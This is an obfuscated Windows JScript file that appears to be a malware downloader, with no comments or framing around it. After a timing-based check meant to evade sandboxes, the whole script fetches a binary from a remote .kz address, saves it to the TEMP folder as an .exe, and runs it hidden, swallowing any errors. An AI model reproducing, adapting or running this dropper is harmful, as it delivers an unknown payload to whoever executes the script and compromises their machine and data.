var _OC = false;
var _P0 = "CreateObject";
var _E = function _Z() {return WScript[_P0]("WScript"+".Shell");}(), _Q = 11;
var _PU = "MSXML2.XMLHTTP";
var _R = 2123213;
var _N = 0;
function _XJ(_A){_E["Run"](_A, _N, _N);};
function _H(){return _PU + "";};
function _M(_G, _CA){_N = _N * 1; return _G - _CA;};
function _I(){return _P0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _OC = true;
  @end
@*/
if (_OC)
{
var _BS = "";
function _Z0(){return 22;};
var _Z1 = 0; var _I1 = 0;
function _MA()
{
var _D0 = new this["Date"]();
var _EU = _D0["getUTCMilliseconds"]();
WScript["Sleep"](_Z0());
var _D0 = new this["Date"]();
var _GS = _D0["getUTCMilliseconds"]();
WScript["Sleep"](_Z0());
var _D0 = new this["Date"]();
var _I0 = _D0["getUTCMilliseconds"]();
var _Z1 = "_AF";
_Z1 = _M(_GS, _EU);
var _I1 = "_WV";
_I1 = _M(_I0, _GS);
_BS = "open";
return _M(_Z1, _I1);
}
var _LE = false;
var _A0 = false;
for (var _GU0 = _N; _GU0 < _Z0() * 1; _GU0++){if (_MA() != _N){
_LE = true; 
_I1 = "31" + 11 * _Z1 + _I1; 
_A0 = true; 
break;
}}
function _W() {return ((_LE == true) && (_LE == _A0)) ? 1 : _N;};
if (_LE && _W() && _A0){
function _P() {return _E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UiIrPNvy.ex" + "e";};
 _M1 = _H();
 _KN = WScript[_P0](_M1);
 var _WD = 1;
 while (_WD){
try {
	if (_WD == 1)
	{
		_KN[_BS]("GET", "http://zakazdetali.kz/v7bsad", false);
		_KN["send"]();
		_D = "Sleep";
	}
	WScript[_D](_Z0() + 120); 
	if (_KN["readystate"] < 2 * 2) continue;
	_WD = _N;
	function _QT(_S) {var _ZC = (1, 2, 3, 4, 5, _S); return _ZC;};
	_BF = WScript[_I()]("ADODB.Stream");
	_M1 = _BF;
	_M1[_BS]();
	_M1["type"] = _QT(1);
	_M1["write"](_KN["ResponseBody"]);
	_BF["position"] = _QT(_N);
	_M1["Save" + "ToFile"](_P(), 2);
	_BF["cl"+"ose"]();
	_GU = _P();
	_XJ(_GU);
} catch(_M0){};
}
}
}

